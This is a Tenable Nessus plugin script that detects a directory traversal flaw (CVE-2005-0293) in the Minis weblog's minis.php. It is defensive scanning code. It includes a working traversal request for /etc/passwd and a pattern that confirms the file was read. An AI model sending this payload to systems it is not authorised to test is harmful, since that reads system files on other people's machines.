#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(16179);
 script_cve_id("CVE-2005-0293");
 script_bugtraq_id(12279); 
 script_osvdb_id(13008);
 script_xref(name:"Secunia", value:"13866");
 script_version("$Revision: 1.13 $");
 script_name(english:"Minis minis.php month Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for a file reading flaw in minis");
 
 script_set_attribute( attribute:"synopsis",  value:
"A web application on the remote host has a directory traversal
vulnerability." );
 script_set_attribute( attribute:"description",  value:
"The remote host is running Minis, a weblogging system written in PHP.

The remote version of this software is vulnerable to a directory
traversal attack.  Input to the 'month' parameter of the 'minis.php'
script is not properly sanitized.  A remote attacker could exploit
this to read arbitrary files from the system." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2005/Jan/193"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/01/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/01/16");
 script_cvs_date("$Date: 2016/11/18 19:03:16 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir ( cgi_dirs() )
{
 url = dir + "/minis.php?month=../../../../../../etc/passwd";
 res = http_send_recv3(method:"GET", item:url, port:port);
 if (isnull(res)) exit(1, "The web server didn't respond.");

 if ( egrep(pattern:"root:.*:0:[01]:.*:.*:", string:res[2]) )
 {
	 security_warning(port);
	 exit(0);
 }
}
